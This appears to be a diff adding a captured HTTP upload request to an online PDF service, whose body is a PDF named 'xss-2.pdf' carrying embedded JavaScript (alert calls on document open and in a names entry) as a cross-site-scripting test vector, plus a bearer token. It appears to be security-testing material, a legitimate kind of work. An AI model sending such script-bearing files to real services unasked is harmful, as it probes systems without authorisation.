@@ -1,0 +1,502 @@
+POST /v1/upload HTTP/2
+Host: api45.ilovepdf.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiIiLCJhdWQiOiIiLCJpYXQiOjE1MjMzNjQ4MjQsIm5iZiI6MTUyMzM2NDgyNCwianRpIjoicHJvamVjdF9wdWJsaWNfYzkwNWRkMWMwMWU5ZmQ3NzY5ODNjYTQwZDBhOWQyZjNfT1Vzd2EwODA0MGI4ZDJjN2NhM2NjZGE2MGQ2MTBhMmRkY2U3NyJ9.qvHSXgCJgqpC4gd6-paUlDLFmg0o2DsOvb1EUYPYx_E
+Content-Type: multipart/form-data; boundary=----geckoformboundary7ea34eeef40daa9e3e1eb26f5666677b
+Content-Length: 131123
+Origin: https://www.ilovepdf.com
+Referer: https://www.ilovepdf.com/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+Te: trailers
+
+------geckoformboundary7ea34eeef40daa9e3e1eb26f5666677b
+Content-Disposition: form-data; name="name"
+
+xss-2.pdf
+------geckoformboundary7ea34eeef40daa9e3e1eb26f5666677b
+Content-Disposition: form-data; name="chunk"
+
+0
+------geckoformboundary7ea34eeef40daa9e3e1eb26f5666677b
+Content-Disposition: form-data; name="chunks"
+
+1
+------geckoformboundary7ea34eeef40daa9e3e1eb26f5666677b
+Content-Disposition: form-data; name="task"
+
+stzgjlfhlrt29rp6rwttydsdqA3zkv69bs05xwdjj138mA0d62xql88pdxk2dq06jk6bxxgvf4zbf1w9wx4d81d4plkh0hpbd6byt0ljybyj78z645hddmysj0yA10vwwh654td58f2j3ttckll6hmh8Ahzvkn5wl3fsb7ybgx2cjjb7f6qq
+------geckoformboundary7ea34eeef40daa9e3e1eb26f5666677b
+Content-Disposition: form-data; name="preview"
+
+1
+------geckoformboundary7ea34eeef40daa9e3e1eb26f5666677b
+Content-Disposition: form-data; name="pdfinfo"
+
+1
+------geckoformboundary7ea34eeef40daa9e3e1eb26f5666677b
+Content-Disposition: form-data; name="pdfforms"
+
+0
+------geckoformboundary7ea34eeef40daa9e3e1eb26f5666677b
+Content-Disposition: form-data; name="pdfresetforms"
+
+0
+------geckoformboundary7ea34eeef40daa9e3e1eb26f5666677b
+Content-Disposition: form-data; name="v"
+
+web.0
+------geckoformboundary7ea34eeef40daa9e3e1eb26f5666677b
+Content-Disposition: form-data; name="file"; filename="xss-2.pdf"
+Content-Type: application/pdf
+
+%PDF-1.4
+%âãÏÓ
+1 0 obj
+<<
+/CreationDate (D:20221227140743+08'00')
+/Creator (þÿÅcw)
+/ModDate (D:20221227143452+08'00')
+/Producer (PDF-XChange Core API SDK \(7.0.324.2\))
+>>
+endobj
+2 0 obj
+<<
+/Metadata 3 0 R
+/Names 4 0 R
+/Pages 5 0 R
+/Type /Catalog
+>>
+endobj
+3 0 obj
+<<
+/Length 2983
+/Subtype /XML
+/Type /Metadata
+>>
+stream
+<?xpacket begin="ï»¿" id="W5M0MpCehiHzreSzNTczkc9d"?>
+<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="XMP Core 5.5.0">
+	<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+		<rdf:Description rdf:about=""
+				xmlns:dc="http://purl.org/dc/elements/1.1/"
+				xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/"
+				xmlns:xmp="http://ns.adobe.com/xap/1.0/"
+				xmlns:pdf="http://ns.adobe.com/pdf/1.3/">
+			<dc:format>application/pdf</dc:format>
+			<xmpMM:DocumentID>uuid:672f8f40-8bb8-4e84-80f3-85248405e1d2</xmpMM:DocumentID>
+			<xmpMM:InstanceID>uuid:31563025-07b1-49e6-9eb9-840f13bdb9cb</xmpMM:InstanceID>
+			<xmp:CreateDate>2022-12-27T14:07:43+08:00</xmp:CreateDate>
+			<xmp:CreatorTool>è¿æ·PDFç¼è¾å¨ 7.0.324.2</xmp:CreatorTool>
+			<xmp:ModifyDate>2022-12-27T14:34:52+08:00</xmp:ModifyDate>
+			<pdf:Producer>PDF-XChange Core API SDK (7.0.324.2)</pdf:Producer>
+		</rdf:Description>
+	</rdf:RDF>
+</x:xmpmeta>
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                           
+<?xpacket end="w"?>
+endstream
+endobj
+4 0 obj
+<<
+/JavaScript 6 0 R
+>>
+endobj
+5 0 obj
+<<
+/Count 1
+/Kids [7 0 R]
+/Type /Pages
+>>
+endobj
+6 0 obj
+<<
+/Names [(xss) <<
+/JS (app.alert\('/xss2/'\))
+/S /JavaScript
+>>]
+>>
+endobj
+7 0 obj
+<<
+/AA <<
+/O <<
+/JS (app.alert\('/xss1/'\))
+/S /JavaScript
+>>
+>>
+/Contents 8 0 R
+/MediaBox [0 0 595.275591 841.889764]
+/Parent 5 0 R
+/Resources <<
+/XObject <<
+/Fm0 9 0 R
+/Fm1 10 0 R
+/Fm2 11 0 R
+/Fm3 12 0 R
+/Fm4 13 0 R
+/Fm5 14 0 R
+>>
+>>
+/Type /Page
+>>
+endobj
+8 0 obj
+<<
+/Filter [/FlateDecode]
+/Length 148
+>>
+stream
+xÚÍÎA
+Â0á}N10ÉI ´Õ (¸¥ i5Ä·¡àÌîý¼Í'Ö)Áw¹ªÄéuÍïG/.>÷)útçoü->i¬kØ´
+{2Ã$ÄR;°7ióO@Ä­Cí,(©¸1Ò.2±ÚÙvß0ñ7Ä²*¡K@`	ú!>ÅcÑ2
+endstream
+endobj
+9 0 obj
+<<
+/BBox [0 0 70 11.169999]
+/Filter [/FlateDecode]
+/LastModified (D:20221227141124+08'00')
+/Length 107
+/PieceInfo <<
+/ADBE_CompoundType <<
+/DocSettings 15 0 R
+/LastModified (D:20221227141124+08'00')
+/Private /Watermark
+>>
+>>
+/Resources <<
+/ExtGState <<
+/GS0 16 0 R
+>>
+/Font <<
+/F0 17 0 R
+/F1 18 0 R
+>>
+>>
+/Subtype /Form
+/Type /XObject
+>>
+stream
+xÚÓw6PH/Vp
+áÒ
+
+!É ¢\ÁÐ
+endstream
+endobj
+10 0 obj
+<<
+/BBox [0 0 70 11.169999]
+/Filter [/FlateDecode]
+/LastModified (D:20221227141633+08'00')
+/Length 107
+/PieceInfo <<
+/ADBE_CompoundType <<
+/DocSettings 19 0 R
+/LastModified (D:20221227141633+08'00')
+/Private /Watermark
+>>
+>>
+/Resources <<
+/ExtGState <<
+/GS0 20 0 R
+>>
+/Font <<
+/F0 21 0 R
+/F1 22 0 R
+>>
+>>
+/Subtype /Form
+/Type /XObject
+>>
+stream
+xÚÓw6PH/Vp
+áÒ
+!É ¢\ÁÐ
+endstream
+endobj
+11 0 obj
+<<
+/BBox [0 0 70 11.169999]
+/Filter [/FlateDecode]
+/LastModified (D:20221227142429+08'00')
+/Length 107
+/PieceInfo <<
+/ADBE_CompoundType <<
+/DocSettings 23 0 R
+/LastModified (D:20221227142429+08'00')
+/Private /Watermark
+>>
+>>
+/Resources <<
+/ExtGState <<
+/GS0 24 0 R
+>>
+/Font <<
+/F0 25 0 R
+/F1 26 0 R
+>>
+>>
+/Subtype /Form
+/Type /XObject
+>>
+stream
+xÚÓw6PH/Vp
+áÒ
+!É ¢\ÁÐ
+endstream
+endobj
+12 0 obj
+<<
+/BBox [0 0 70 11.169999]
+/Filter [/FlateDecode]
+/LastModified (D:20221227142544+08'00')
+/Length 107
+/PieceInfo <<
+/ADBE_CompoundType <<
+/DocSettings 27 0 R
+/LastModified (D:20221227142544+08'00')
+/Private /Watermark
+>>
+>>
+/Resources <<
+/ExtGState <<
+/GS0 28 0 R
+>>
+/Font <<
+/F0 29 0 R
+/F1 30 0 R
+>>
+>>
+/Subtype /Form
+/Type /XObject
+>>
+stream
+xÚÓw6PH/Vp
+áÒ
+!É ¢\ÁÐ
+endstream
+endobj
+13 0 obj
+<<
+/BBox [0 0 70 11.169999]
+/Filter [/FlateDecode]
+/LastModified (D:20221227142748+08'00')
+/Length 107
+/PieceInfo <<
+/ADBE_CompoundType <<
+/DocSettings 31 0 R
+/LastModified (D:20221227142748+08'00')
+/Private /Watermark
+>>
+>>
+/Resources <<
+/ExtGState <<
+/GS0 32 0 R
+>>
+/Font <<
+/F0 33 0 R
+/F1 34 0 R
+>>
+>>
+/Subtype /Form
+/Type /XObject
+>>
+stream
+xÚÓw6PH/Vp
+áÒ
+
+!É ¢\ÁÐ
+endstream
+endobj
+14 0 obj
+<<
+/BBox [0 0 70 11.169999]
+/Filter [/FlateDecode]
+/LastModified (D:20221227143450+08'00')
+/Length 107
+/PieceInfo <<
+/ADBE_CompoundType <<
+/DocSettings 35 0 R
+/LastModified (D:20221227143450+08'00')
+/Private /Watermark
+>>
+>>
+/Resources <<
+/ExtGState <<
+/GS0 36 0 R
+>>
+/Font <<
+/F0 37 0 R
+/F1 38 0 R
+>>
+>>
+/Subtype /Form
+/Type /XObject
+>>
+stream
+xÚÓw6PH/Vp
+áÒ
+
+!É ¢\ÁÐ
+endstream
+endobj
+15 0 obj
+<<
+/Filter [/FlateDecode]
+/Length 351
+>>
+stream
+xÚeR½NÃ0~Ë3mS*P$UêDÕ1É%X8vä8UÛ7à
+@ð4@7^sÒJõt÷ýåÎñïÛ§?Zæ-ÐB+0Þïz¡u"Tæ«hÒr6
+ýk°hr0ws´Ørß7$_èO´²Ì®
+xd*¨â¬R	))ÈR¬©é{]¯>)È	÷B?Â¥K©)Ú*à±Ïûï×éùäçýióñøõüâÏcÈ +JéôÛXJiÖ¸%=ò²XØUËyÝãºÐqã£tA³:ðLKmqÊvðý&ÛkHþ¿A¥uìV±Þ}®õÑ5Ú°Ö«×N§Ùu.¼(¨Y*F4D±AllZmÚ4g 2d:Ij[!ª¤vLVR'&þ³ºL%deÀOéW÷CøL ½=
+endstream
+endobj
+16 0 obj
+<<
+/ca 0.25
+/CA 0.25
+/Type /ExtGState
+>>
+endobj
+17 0 obj
+<<
+/BaseFont /SimHei
+/DescendantFonts [<<
+/BaseFont /SimHei
+/CIDSystemInfo <<
+/Ordering (Identity)
+/Registry (PXCViewer)
+/Supplement 0
+>>
+/FontDescriptor 39 0 R
+/Subtype /CIDFontType2
+/Type /Font
+>>]
+/Encoding /Identity-H
+/Subtype /Type0
+/ToUnicode 40 0 R
+/Type /Font
+>>
+endobj
+18 0 obj
+<<
+/BaseFont /Arial
+/Encoding /WinAnsiEncoding
+/FirstChar 68
+/FontDescriptor 41 0 R
+/LastChar 80
+/Subtype /TrueType
+/Type /Font
+/Widths [722 0 611 0 0 0 0 0 0 0 0 0 667]
+>>
+endobj
+19 0 obj
+<<
+/Filter [/FlateDecode]
+/Length 348
+>>
+stream
+xÚeR½NÃ0~Ë{Û
+©CT:!QµAÌGr	9NÕvgd`Aâ
+x} ¯À9iJ¤zºûþ|gù÷}ë­rÉhJ¡ö=ÎPÅ:*sÀu4í9;ý°hr0÷´Ø²ë/ô§ZYf×<2FTqV©ÀdIH)6Ô½¾WÎäL
+xref
+0 63
+0000000000 65535 f
+0000000015 00000 n
+0000000212 00000 n
+0000000290 00000 n
+0000003355 00000 n
+0000003394 00000 n
+0000003451 00000 n
+0000003536 00000 n
+0000003802 00000 n
+0000004024 00000 n
+0000004502 00000 n
+0000004981 00000 n
+0000005460 00000 n
+0000005939 00000 n
+0000006418 00000 n
+0000006897 00000 n
+0000007323 00000 n
+0000007380 00000 n
+0000007667 00000 n
+0000007856 00000 n
+0000008279 00000 n
+0000008336 00000 n
+0000008623 00000 n
+0000008812 00000 n
+0000009235 00000 n
+0000009292 00000 n
+0000009579 00000 n
+0000009768 00000 n
+0000010191 00000 n
+0000010248 00000 n
+0000010535 00000 n
+0000010724 00000 n
+0000011147 00000 n
+0000011204 00000 n
+0000011491 00000 n
+0000011680 00000 n
+0000012103 00000 n
+0000012160 00000 n
+0000012447 00000 n
+0000012636 00000 n
+0000012857 00000 n
+0000013199 00000 n
+0000013403 00000 n
+0000013624 00000 n
+0000013966 00000 n
+0000014170 00000 n
+0000014391 00000 n
+0000014733 00000 n
+0000014937 00000 n
+0000015158 00000 n
+0000015500 00000 n
+0000015704 00000 n
+0000015925 00000 n
+0000016267 00000 n
+0000016471 00000 n
+0000016692 00000 n
+0000017034 00000 n
+0000017238 00000 n
+0000035751 00000 n
+0000054264 00000 n
+0000072777 00000 n
+0000091290 00000 n
+0000109803 00000 n
+trailer
+<<
+/ID [<F635B3425A8B651B5942DB1F67D47707> <F635B3425A8B651B5942DB1F67D47707>]
+/Info 1 0 R
+/Root 2 0 R
+/Size 63
+>>
+startxref
+128316
+%%EOF
